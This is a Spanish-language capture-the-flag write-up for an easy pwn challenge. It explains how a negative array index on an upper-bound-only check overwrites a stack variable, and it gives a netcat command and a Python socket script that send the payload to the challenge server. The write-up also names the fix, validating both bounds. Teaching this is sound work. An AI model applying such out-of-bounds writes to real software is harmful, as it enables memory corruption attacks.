# Out Of Bounds

| | |
|---|---|
| **Categoría** | Pwn |
| **Dificultad** | Fácil |
| **Puntos** | 100 |
| **Reto #** | 12 |
| **Conexión** | `nc chals.tropicalhunters.com 9005` |

## Descripción

Un libro de cuentas almacena entradas en un array. El índice solo se valida por arriba. Escribir con un índice negativo permite sobrescribir la variable `permission` ubicada antes del array en el stack.

## Análisis

```c
// Stack layout en main():
int permission = 0;    // rbp-0x20
int entries[4];        // rbp-0x1c .. rbp-0x10

if (index > 3) → error    // ✅ valida límite superior
// if (index < 0) → falta  ❌ límite inferior no validado

entries[index] = value;
// mov %edx, -0x1c(%rbp, %rax, 4)
// Con index=-1: -0x1c + (-1)*4 = -0x20 → permission

if (permission == 0x539)   // 1337 decimal
    print_flag();
```

Con `index = -1`, la instrucción de escritura apunta exactamente a `permission` (offset `-0x20` desde `rbp`).

## Solución

```bash
echo "-1 1337" | nc chals.tropicalhunters.com 9005
```

```python
import socket

s = socket.socket()
s.connect(("chals.tropicalhunters.com", 9005))
s.recv(1024)
s.sendall(b"-1 1337\n")
print(s.recv(1024).decode())
```

> 🚩 **Flag:** omitida intencionalmente. Seguí los pasos para obtenerla.

## Takeaways

- Un array con validación solo del límite superior (`index <= N`) es vulnerable a índices negativos.
- En x86-64, `base + index*4` con índice negativo escribe **antes** del array en el stack.
- El valor mágico se obtiene buscando el `cmp` que precede al `call print_flag` en el desensamblado.
- Contramedida: validar siempre ambos extremos: `0 <= index < N`.

---
*Tropical Hunters CTF — Writeup por [Fabián Bustamante](https://github.com/fbustamante55)*
